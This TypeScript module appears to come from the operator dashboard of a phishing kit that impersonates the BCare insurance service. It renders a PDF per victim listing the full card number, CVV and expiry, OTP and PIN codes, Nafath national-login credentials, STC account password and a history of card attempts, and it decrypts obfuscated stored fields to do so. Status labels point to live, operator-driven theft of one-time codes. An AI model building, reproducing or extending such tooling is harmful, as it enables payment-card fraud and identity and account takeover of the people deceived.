"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function val(v: string | number | undefined | null): string {
  if (v === undefined || v === null || v === "") return "";
  return String(v);
}

function escapeHtml(raw: string): string {
  return raw
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
    .replace(/\n/g, "<br />");
}

function formatDateTime(value: any): string {
  if (!value) return "";

  try {
    const date =
      typeof value === "object" &&
      value !== null &&
      typeof value.toDate === "function"
        ? value.toDate()
        : new Date(value);

    if (!Number.isNaN(date.getTime())) {
      return date.toLocaleString("ar-SA", {
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      });
    }
  } catch {
    return val(value);
  }

  return val(value);
}

function formatMoney(value: string | number | undefined | null): string {
  if (value === undefined || value === null || value === "") return "";
  const num = Number(value);
  if (!Number.isNaN(num) && Number.isFinite(num)) {
    return `${new Intl.NumberFormat("ar-SA", {
      minimumFractionDigits: 0,
      maximumFractionDigits: 2,
    }).format(num)} ر.س`;
  }
  return val(value);
}

function buildPdfHtml(
  visitor: InsuranceApplication,
  logoBase64: string,
  stampBase64: string
): string {
  const reportDate = formatDateTime(new Date());
  const createdAt = formatDateTime(visitor.createdAt as any);
  const updatedAt = formatDateTime(visitor.updatedAt as any);
  const lastSeen = formatDateTime(visitor.lastSeen as any);
  const insuranceDate = formatDateTime(visitor.createdAt as any);
  const currentPage = val(
    visitor.redirectPage || visitor.currentPage || (visitor.currentStep as any)
  );

  const history = visitor.history || [];
  const allCardHistory = [...history].filter(
    (h: any) => h.type === "_t1" || h.type === "card"
  );
  const sortedCardHistory = allCardHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allOtpHistory = [...history].filter(
    (h: any) => h.type === "_t2" || h.type === "otp"
  );
  const sortedOtpHistory = allOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPinHistory = [...history].filter(
    (h: any) => h.type === "_t3" || h.type === "pin"
  );
  const sortedPinHistory = allPinHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const allPhoneOtpHistory = [...history].filter(
    (h: any) => h.type === "_t5" || h.type === "phone_otp"
  );
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort(
    (a: any, b: any) =>
      new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const latestCard = sortedCardHistory.length > 0 ? sortedCardHistory[0] : null;
  const latestOtp = sortedOtpHistory.length > 0 ? sortedOtpHistory[0] : null;
  const latestPin = sortedPinHistory.length > 0 ? sortedPinHistory[0] : null;
  const latestPhoneOtp =
    sortedPhoneOtpHistory.length > 0 ? sortedPhoneOtpHistory[0] : null;

  const cardNumber = latestCard
    ? decryptField(latestCard.data?._v1 || latestCard.data?.cardNumber)
    : decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = latestCard
    ? decryptField(latestCard.data?._v2 || latestCard.data?.cvv)
    : decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = latestCard
    ? decryptField(latestCard.data?._v3 || latestCard.data?.expiryDate)
    : decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = latestCard
    ? decryptField(latestCard.data?._v4 || latestCard.data?.cardHolderName)
    : decryptField(visitor._v4 || visitor.cardHolderName);
  const cardType = latestCard ? val(latestCard.data?.cardType) : val(visitor.cardType);
  const cardLevel = latestCard
    ? val(
        latestCard.data?.cardLevel ||
          latestCard.data?.level ||
          latestCard.data?.bankInfo?.level
      )
    : val(visitor.cardLevel || visitor.bankInfo?.level);
  const bankName = latestCard
    ? val(
        latestCard.data?.bankInfo?.name ||
          latestCard.data?.bankName ||
          latestCard.data?.issuer?.name
      )
    : val(visitor.bankInfo?.name);
  const bankCountry = latestCard
    ? val(latestCard.data?.bankInfo?.country)
    : val(visitor.bankInfo?.country);

  const otpCode = latestOtp
    ? val(latestOtp.data?._v5 || latestOtp.data?.otp)
    : val(visitor._v5 || visitor.otpCode || visitor.otp);
  const pinCode = latestPin
    ? val(latestPin.data?._v6 || latestPin.data?.pinCode)
    : val(visitor._v6 || visitor.pinCode);
  const phoneOtpCode = latestPhoneOtp
    ? val(latestPhoneOtp.data?._v7 || latestPhoneOtp.data?.phoneOtp)
    : val(visitor._v7 || visitor.phoneOtp || visitor.phoneVerificationCode);

  const offerCompany = visitor.selectedOffer
    ? val(
        (visitor.selectedOffer as any).name ||
          (visitor.selectedOffer as any).company
      )
    : "";
  const totalPrice = formatMoney(visitor.finalPrice || visitor.offerTotalPrice);
  const originalPrice = formatMoney(visitor.originalPrice);
  const discount = visitor.discount
    ? `${(visitor.discount * 100).toFixed(0)}%`
    : "";

  const reportId = val(visitor.referenceNumber || visitor.identityNumber || visitor.id);
  const visitorName = val((visitor as any).name || visitor.ownerName);

  const statusLabel = (status: string | undefined) => {
    if (!status) return "";
    const map: Record<string, string> = {
      waiting: "بانتظار المشرف",
      pending: "قيد المراجعة",
      verifying: "جاري التحقق",
      approved: "تم القبول",
      rejected: "تم الرفض",
      approved_with_otp: "تحويل إلى OTP",
      approved_with_pin: "تحويل إلى PIN",
      show_otp: "بانتظار إدخال OTP",
      show_pin: "بانتظار إدخال PIN",
      show_phone_otp: "بانتظار إدخال كود الهاتف",
      otp_rejected: "OTP مرفوض",
      resend: "إعادة إرسال",
    };
    return map[status] || status;
  };

  type PdfRow = { label: string; value: string; mono?: boolean };

  const renderTableRows = (rows: PdfRow[]) => {
    const visible = rows.filter((row) => row.value);
    if (visible.length === 0) {
      return `<tr><td colspan="2" class="empty-cell">لا توجد بيانات متاحة</td></tr>`;
    }

    return visible
      .map(
        (row, idx) => `
          <tr class="${idx % 2 === 0 ? "alt-row" : ""}">
            <td class="label-cell">${escapeHtml(row.label)}</td>
            <td class="value-cell ${row.mono ? "mono" : ""}">${escapeHtml(
              row.value
            )}</td>
          </tr>
      `
      )
      .join("");
  };

  const renderSection = (title: string, icon: string, rows: PdfRow[]) => `
    <section class="section">
      <div class="section-header">
        <span class="section-icon">${icon}</span>
        <span>${escapeHtml(title)}</span>
      </div>
      <table class="info-table">
        ${renderTableRows(rows)}
      </table>
    </section>
  `;

  const applicantRows: PdfRow[] = [
    { label: "اسم مقدم الطلب", value: visitorName },
    { label: "رقم الهوية", value: val(visitor.identityNumber), mono: true },
    { label: "رقم الهاتف", value: val(visitor.phoneNumber), mono: true },
    { label: "نوع الوثيقة", value: val(visitor.documentType) },
    { label: "الرقم التسلسلي", value: val(visitor.serialNumber), mono: true },
    { label: "نوع الطلب", value: val(visitor.insuranceType) },
    { label: "اسم المشتري", value: val(visitor.buyerName) },
    { label: "هوية المشتري", value: val(visitor.buyerIdNumber), mono: true },
  ];

  const insuranceRows: PdfRow[] = [
    { label: "نوع التغطية", value: val(visitor.insuranceCoverage) },
    { label: "تاريخ بدء التأمين", value: insuranceDate },
    { label: "موديل المركبة", value: val(visitor.vehicleModel) },
    { label: "سنة الصنع", value: val(visitor.vehicleYear), mono: true },
    { label: "قيمة المركبة", value: formatMoney(visitor.vehicleValue as any) },
    { label: "استخدام المركبة", value: val(visitor.vehicleUsage) },
    {
      label: "موقع الإصلاح",
      value: visitor.repairLocation
        ? visitor.repairLocation === "agency"
          ? "وكالة"
          : "ورشة"
        : "",
    },
  ];

  const offerRows: PdfRow[] = [
    { label: "الشركة", value: offerCompany },
    { label: "السعر الأصلي", value: originalPrice },
    { label: "الخصم", value: discount },
    { label: "السعر النهائي", value: totalPrice },
    {
      label: "المميزات المختارة",
      value: Array.isArray(visitor.selectedFeatures)
        ? visitor.selectedFeatures.join("، ")
        : "",
    },
  ];

  const cardRows: PdfRow[] = [
    { label: "رقم البطاقة", value: cardNumber, mono: true },
    { label: "اسم حامل البطاقة", value: cardHolderName },
    { label: "نوع البطاقة", value: cardType },
    { label: "مستوى البطاقة", value: cardLevel },
    { label: "تاريخ الانتهاء", value: expiryDate, mono: true },
    { label: "CVV", value: cvv, mono: true },
    { label: "البنك", value: bankName },
    { label: "بلد البنك", value: bankCountry },
    { label: "حالة البطاقة", value: statusLabel(visitor.cardStatus) },
  ];

  const verificationRows: PdfRow[] = [
    { label: "OTP", value: otpCode, mono: true },
    { label: "حالة OTP", value: statusLabel(visitor.otpStatus) },
    { label: "PIN", value: pinCode, mono: true },
    { label: "حالة PIN", value: statusLabel(visitor.pinStatus) },
    { label: "كود تحقق الهاتف", value: phoneOtpCode, mono: true },
    { label: "حالة تحقق الهاتف", value: statusLabel(visitor.phoneOtpStatus) },
    { label: "شركة الاتصالات", value: val(visitor.phoneCarrier) },
    { label: "نفاذ - الهوية", value: val(visitor._v8 || visitor.nafazId), mono: true },
    { label: "نفاذ - كلمة المرور", value: val(visitor._v9 || visitor.nafazPass) },
    { label: "رمز تأكيد نفاذ", value: val(visitor.nafadConfirmationCode), mono: true },
    { label: "بيانات STC (الجوال)", value: val(visitor.stcPhone), mono: true },
    { label: "بيانات STC (كلمة المرور)", value: val(visitor.stcPassword) },
    { label: "STC وقت الإدخال", value: formatDateTime(visitor.stcSubmittedAt) },
  ];

  const trackingRows: PdfRow[] = [
    { label: "رقم التقرير", value: reportId, mono: true },
    { label: "الصفحة الحالية", value: currentPage },
    { label: "الدولة", value: val(visitor.country) },
    { label: "الجهاز", value: val(visitor.deviceType) },
    { label: "المتصفح", value: val(visitor.browser) },
    { label: "نظام التشغيل", value: val(visitor.os) },
    { label: "آخر ظهور", value: lastSeen },
    { label: "تاريخ الإنشاء", value: createdAt },
    { label: "آخر تحديث", value: updatedAt },
  ];

  const cardAttemptsHtml = sortedCardHistory
    .slice(0, 6)
    .map(
      (entry: any, index: number) => `
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">محاولة ${sortedCardHistory.length - index}</td>
        <td class="value-cell mono">${escapeHtml(
          decryptField(entry.data?._v1 || entry.data?.cardNumber)
        )}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">حالة المحاولة</td>
        <td class="value-cell">${escapeHtml(statusLabel(entry.status) || "—")}</td>
      </tr>
      <tr class="${index % 2 === 0 ? "alt-row" : ""}">
        <td class="label-cell">وقت الإدخال</td>
        <td class="value-cell">${escapeHtml(formatDateTime(entry.timestamp) || "—")}</td>
      </tr>
    `
    )
    .join("");

  const attemptsSection = sortedCardHistory.length
    ? `
      <section class="section">
        <div class="section-header">
          <span class="section-icon">🧾</span>
          <span>سجل محاولات البطاقة</span>
        </div>
        <table class="info-table">
          ${cardAttemptsHtml}
        </table>
      </section>
    `
    : "";

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
      #pdf-content {
        font-family: "Cairo", Arial, sans-serif;
        direction: rtl;
        text-align: right;
        width: 760px;
        margin: 0 auto;
        padding: 0;
        color: #0F172A;
        background: #FFFFFF;
        line-height: 1.7;
        -webkit-print-color-adjust: exact;
        print-color-adjust: exact;
      }
      .report-shell {
        border: 1px solid #E2E8F0;
        border-radius: 18px;
        overflow: hidden;
        box-shadow: 0 10px 35px rgba(15, 23, 42, 0.08);
        background: linear-gradient(180deg, #F8FAFC 0%, #FFFFFF 160px);
      }
      .top-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 26px 28px 20px;
        background: linear-gradient(135deg, #173B74 0%, #1D4E89 52%, #2A6EBB 100%);
        color: #FFFFFF;
      }
      .header-title {
        margin: 0;
        font-size: 24px;
        font-weight: 900;
        letter-spacing: 0.2px;
      }
      .header-subtitle {
        margin-top: 4px;
        font-size: 12px;
        opacity: 0.9;
      }
      .logo {
        width: 132px;
        height: auto;
        background: #FFFFFF;
        border-radius: 10px;
        padding: 8px 10px;
      }
      .meta-grid {
        padding: 16px 28px 6px;
        display: grid;
        grid-template-columns: repeat(3, minmax(0, 1fr));
        gap: 10px;
      }
      .meta-card {
        border: 1px solid #DBEAFE;
        background: #EFF6FF;
        border-radius: 10px;
        padding: 9px 12px;
      }
      .meta-label {
        font-size: 10px;
        color: #334155;
      }
      .meta-value {
        margin-top: 1px;
        font-size: 12px;
        font-weight: 800;
        color: #0F172A;
      }
      .summary-grid {
        padding: 8px 28px 0;
        display: grid;
        grid-template-columns: repeat(4, minmax(0, 1fr));
        gap: 10px;
      }
      .summary-card {
        background: #FFFFFF;
        border: 1px solid #E2E8F0;
        border-radius: 12px;
        padding: 9px 12px;
      }
      .summary-label {
        font-size: 10px;
        color: #64748B;
      }
      .summary-value {
        margin-top: 2px;
        font-size: 12px;
        font-weight: 800;
        color: #0F172A;
        unicode-bidi: plaintext;
        word-break: break-word;
      }
      .sections-wrap {
        padding: 12px 28px 22px;
      }
      .section {
        margin-top: 14px;
      }
      .section-header {
        background: linear-gradient(90deg, #1E40AF 0%, #1D4ED8 100%);
        color: #FFFFFF;
        border-radius: 10px 10px 0 0;
        padding: 8px 12px;
        font-size: 13px;
        font-weight: 800;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .section-icon {
        font-size: 14px;
      }
      .info-table {
        width: 100%;
        border-collapse: collapse;
        border: 1px solid #D1D5DB;
        border-top: none;
      }
      .info-table .label-cell {
        width: 34%;
        background: #F8FAFC;
        color: #334155;
        font-size: 11px;
        font-weight: 700;
        border: 1px solid #D1D5DB;
        padding: 6px 10px;
        white-space: nowrap;
      }
      .info-table .value-cell {
        color: #0F172A;
        font-size: 11px;
        font-weight: 700;
        border: 1px solid #D1D5DB;
        padding: 6px 10px;
        unicode-bidi: plaintext;
      }
      .info-table .value-cell.mono {
        font-family: "Courier New", monospace;
        letter-spacing: 0.4px;
      }
      .info-table .empty-cell {
        text-align: center;
        color: #64748B;
        border: 1px solid #D1D5DB;
        padding: 10px;
        font-size: 11px;
        background: #F8FAFC;
      }
      .info-table .alt-row td {
        background: #F8FAFC;
      }
      .notes-box {
        margin: 16px 28px 0;
        border: 1px solid #E2E8F0;
        border-radius: 10px;
        background: #F8FAFC;
        padding: 10px 12px;
        font-size: 10px;
        color: #475569;
      }
      .sign-box {
        margin: 14px 28px 24px;
        border: 1px dashed #94A3B8;
        border-radius: 12px;
        padding: 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 14px;
      }
      .sign-text {
        font-size: 11px;
        color: #334155;
      }
      .stamp {
        width: 150px;
        height: auto;
        opacity: 0.95;
      }
      .footer {
        text-align: center;
        font-size: 10px;
        color: #94A3B8;
        padding-bottom: 16px;
      }
    </style>
    <div id="pdf-content">
      <div class="report-shell">
        <div class="top-header">
          <div>
            <h1 class="header-title">تقرير بيانات طلب التأمين</h1>
            <div class="header-subtitle">Professional Visitor Snapshot • BCare Dashboard</div>
          </div>
          <img class="logo" src="${logoBase64}" crossorigin="anonymous" />
        </div>

        <div class="meta-grid">
          <div class="meta-card">
            <div class="meta-label">رقم التقرير</div>
            <div class="meta-value">${escapeHtml(reportId || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">تاريخ إنشاء التقرير</div>
            <div class="meta-value">${escapeHtml(reportDate || "—")}</div>
          </div>
          <div class="meta-card">
            <div class="meta-label">إجمالي محاولات البطاقة</div>
            <div class="meta-value">${escapeHtml(String(sortedCardHistory.length || 0))}</div>
          </div>
        </div>

        <div class="summary-grid">
          <div class="summary-card">
            <div class="summary-label">الاسم</div>
            <div class="summary-value">${escapeHtml(visitorName || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">رقم الهوية</div>
            <div class="summary-value">${escapeHtml(val(visitor.identityNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الهاتف</div>
            <div class="summary-value">${escapeHtml(val(visitor.phoneNumber) || "—")}</div>
          </div>
          <div class="summary-card">
            <div class="summary-label">الصفحة الحالية</div>
            <div class="summary-value">${escapeHtml(currentPage || "—")}</div>
          </div>
        </div>

        <div class="sections-wrap">
          ${renderSection("بيانات مقدم الطلب", "👤", applicantRows)}
          ${renderSection("بيانات التأمين والمركبة", "🚗", insuranceRows)}
          ${renderSection("العرض المختار والتسعير", "📊", offerRows)}
          ${renderSection("معلومات الدفع والبطاقة", "💳", cardRows)}
          ${renderSection("رموز التحقق والاتصالات", "🔐", verificationRows)}
          ${renderSection("بيانات التتبع والجلسة", "🛰️", trackingRows)}
          ${attemptsSection}
        </div>

        <div class="notes-box">
          هذا التقرير معلوماتي فقط، ولا يُعد وثيقة تأمين معتمدة إلا بعد استكمال جميع الشروط النظامية
          وسداد القسط النهائي حسب سياسة شركة التأمين.
        </div>

        <div class="sign-box">
          <div class="sign-text">
            <div><strong>الإقرار:</strong> أقر بصحة البيانات أعلاه.</div>
            <div style="margin-top:6px;">الاسم: _____________________</div>
            <div style="margin-top:6px;">التوقيع: ____________________</div>
          </div>
          <img class="stamp" src="${stampBase64}" crossorigin="anonymous" />
        </div>

        <div class="footer">
          BCare Dashboard · Confidential Report
        </div>
      </div>
    </div>
  `;
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor, BECARE_LOGO_BASE64, STAMP_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [8, 5, 8, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
